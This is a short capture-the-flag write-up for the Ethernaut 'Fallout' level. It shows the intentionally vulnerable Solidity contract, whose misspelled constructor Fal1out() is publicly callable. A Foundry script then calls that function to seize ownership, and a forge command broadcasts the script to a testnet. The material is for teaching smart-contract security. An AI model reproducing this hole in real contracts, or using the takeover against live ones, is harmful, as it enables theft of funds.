---
title: "Fal1out"
date: "2024-02-12T09:15:00.000Z"
lastmod: "2024-02-12T09:30:00.000Z"
draft: false
type: "docs"
Difficulty: "⭐"
Date: "2024-01-16"
next: "fallback-3b8b2299aa214a02b189968fcb7e63fb"
prev: "telephone-b59b329cb2184d118a98135159a4b7e3"
State: "Terminé"
NOTION_METADATA:
  object: "page"
  id: "adc1e968-66bc-443c-8f73-279d9d54ddcc"
  created_time: "2024-02-12T09:15:00.000Z"
  last_edited_time: "2024-02-12T09:30:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel2.svg"
  parent:
    type: "database_id"
    database_id: "8eb542ce-cd0a-4616-90c5-674614439ec0"
  archived: false
  properties:
    type:
      id: "AcKd"
      type: "select"
      select:
        id: "YEpZ"
        name: "docs"
        color: "default"
    Difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "FPYQ"
        name: "⭐"
        color: "gray"
    Date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-01-16"
        end: null
        time_zone: null
    next:
      id: "%5Eru%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "fallback-3b8b2299aa214a02b189968fcb7e63fb"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "fallback-3b8b2299aa214a02b189968fcb7e63fb"
          href: null
    prev:
      id: "a%5Dip"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "telephone-b59b329cb2184d118a98135159a4b7e3"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "telephone-b59b329cb2184d118a98135159a4b7e3"
          href: null
    State:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    URL:
      id: "juZs"
      type: "url"
      url: null
    Name:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Fal1out"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Fal1out"
          href: null
  url: "https://www.notion.so/Fal1out-adc1e96866bc443c8f73279d9d54ddcc"
  public_url: null
UPDATE_TIME: "2024-02-12T09:31:04.695Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```


We have to claim the owner ship of the program, we can see that their is nothing that seems to prevent us from calling Fal1out() so let’s try that:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";


interface Fallout {
  function allocatorBalance(address allocator) external view returns (uint);

  function Fal1out() external payable;

  function allocate() external payable;

  function sendAllocation(address payable allocator) external;

  function collectAllocations() external;
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_02");
        console.logAddress(addr);
        vm.startBroadcast(deployerPrivateKey);

        Fallout instance = Fallout(addr);
        instance.Fal1out{value: 1}(); //value 1 isnot needed but just in case


        vm.stopBroadcast();
    }
}
```


```solidity
source .env
forge script ./script/02.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv
```

